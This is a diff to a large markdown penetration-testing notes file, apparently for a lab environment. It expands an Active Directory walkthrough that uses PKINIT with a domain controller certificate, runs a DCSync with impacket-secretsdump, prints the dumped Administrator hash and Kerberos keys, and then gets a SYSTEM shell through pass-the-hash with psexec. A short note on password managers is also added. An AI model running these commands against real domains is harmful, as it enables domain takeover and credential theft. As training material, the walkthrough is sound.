@@ -5795,7 +5795,7 @@ pip3 install -I git+https://github.com/wbond/oscrypto.git
 
 >Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.
 
-**Run PKINIT**
+**Run PKINIT (inside the .venv)**
 
 ```bash
 python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
@@ -5816,11 +5816,14 @@ python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip <DC01_IP> '<corp.local>/
 # INFO:minikerberos:Saved TGT to file
 ```
 
-Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:
+Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example:
+
+**Retrieve the NTLM hash of the domain administrator account (inside the .venv)**
 
 ```bash
 export KRB5CCNAME=/tmp/dc.ccache
-impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<CORP.RTH>/DC01$'@DC01.<CORP.RTH>
+echo "<DC01_IP> DC01.<CORP>.LOCAL" | sudo tee -a /etc/hosts
+impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<CORP>.LOCAL/DC01$'@DC01.<CORP>.LOCAL
 ```
 
 **Expected Output**
@@ -5830,8 +5833,39 @@ impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<
 
 # [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 # [*] Using the DRSUAPI method to get NTDS.DIT secrets
-# Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
+# [*] Kerberos keys grabbed
+# Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
+# Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
+# Administrator:des-cbc-md5:a1f262b50b64c46b
+# [*] Cleaning up... 
 ```
+
+**Access the DC01's Administrator account using the Hash (inside the .venv)**
+
+```bash
+impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_IP>
+```
+
+**Expected Output**
+
+```bash
+# Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+# [*] Requesting shares on 10.129.234.174.....
+# [*] Found writable share ADMIN$
+# [*] Uploading file LDngItrz.exe
+# [*] Opening SVCManager on 10.129.234.174.....
+# [*] Creating service kGAO on 10.129.234.174.....
+# [*] Starting service kGAO.....
+# [!] Press help for extra shell commands
+# Microsoft Windows [Version 10.0.17763.2628]
+# (c) 2018 Microsoft Corporation. All rights reserved.
+
+# C:\Windows\system32>
+```
+
+
 
 </details>
 
@@ -6041,6 +6075,10 @@ This tools evaluate the strength of passwords:
 
 <details>
 <summary><h2>Password Managers</h2></summary>
+
+According to a [study conducted by NordPass](https://www.techradar.com/news/most-people-have-25-more-passwords-than-at-the-start-of-the-pandemic), the average person now has around 100 passwords. This is one of the main reasons people often reuse passwords or create overly simple ones.
+
+
 
 </details>
 
